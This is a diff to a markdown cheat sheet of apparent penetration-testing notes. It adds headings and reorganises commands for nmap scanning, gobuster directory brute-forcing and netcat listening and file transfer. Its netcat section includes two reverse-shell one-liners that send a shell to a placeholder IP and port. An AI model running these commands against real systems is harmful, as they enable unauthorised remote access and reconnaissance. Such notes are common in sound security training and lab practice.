@@ -8,11 +8,13 @@ sort_key: 1
 
 {% include project-headers.html %}
 
+#### Nmap Recon
 Use nmap to scan ports and try to find details about services and versions on those ports 
 ```bash
 nmap -sV -sC <target>
 ```
 
+#### Finding web routes
 Try bruteforce webpages/directories using [gobuster](https://github.com/OJ/gobuster)
 ```bash
 gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
@@ -20,9 +22,12 @@ gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-me
 
 #### Netcat commands
 ```
+basic connection:
 nc -lvnp 4444 [> /path/to/file.ext]
-nc -e /bin/bash <ip> <port>
+nc <ip> <port> [< /path/to/file.ext]
 
+reverse shells:
+nc -e /bin/bash <ip> <port>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 ```
 
